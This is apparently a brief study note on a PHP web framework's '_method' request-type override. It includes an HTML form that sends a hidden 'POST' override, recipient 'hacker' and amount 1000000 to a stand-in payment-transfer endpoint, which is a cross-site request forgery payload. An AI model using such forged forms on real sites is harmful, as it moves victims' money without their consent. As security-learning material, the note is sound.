---
tags:
  - web
---
A [[PHP]] [[Web Framework]].
Allows setting the request type with `_method` parameter:
```html
<form action="https://vulnerable-website.com/account/transfer-payment" method="GET"> 
	<input type="hidden" name="_method" value="POST"> <input type="hidden" name="recipient" value="hacker">
	<input type="hidden" name="amount" value="1000000"> 
</form>
```